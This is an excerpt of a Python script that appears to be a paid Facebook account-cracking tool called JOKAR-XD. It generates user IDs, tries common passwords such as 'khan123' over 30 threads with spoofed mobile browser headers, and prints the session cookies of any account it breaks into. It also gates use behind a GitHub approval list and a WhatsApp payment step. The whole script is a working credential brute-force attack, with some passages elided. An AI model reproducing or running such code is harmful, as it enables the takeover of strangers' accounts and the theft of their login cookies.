...
ugen=["Mozilla/5.0 (Linux; Android 11; Lenovo TB-7306F Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/hu_HU;FBAV/323.0.0.9.106;]",
...
def menu():
	os.system('xdg-open https://www.facebook.com/profile.php?id=100078180585996=ZbWKwL')
	print(logo)
...
def ali_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'khankhan','khan1122','khan12','khan123','khan12345']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
    ...
    try:
        for ps in pwx:
            ...
            'cache-control': 'max-age=0',
             ...
             'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36','viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[JOKAR-X-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[JOKAR-XD-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mJOKAR-XD\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/Jok4rsoj1b4/FREE.FIRE/blob/main/Aprov.txt').text
    if id in httpCaht:
      ...
      print("YOUR KEY : "+id)
      print('\33[1;37m15-Days Price: 200 TAKA BD')
      print("\33[1;32m1-Month Price: 500 TAKA BD:")                  
      print('\33[1;37m-----------NOTES--------------------------')
      print("\33[1;37mTOOL IS PAID BUT YOU HAVE TO\nGET APPROVAL FIRST.")
      print('\33[1;37m----------------------------------------------')
      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
      input('IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/01609859866?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
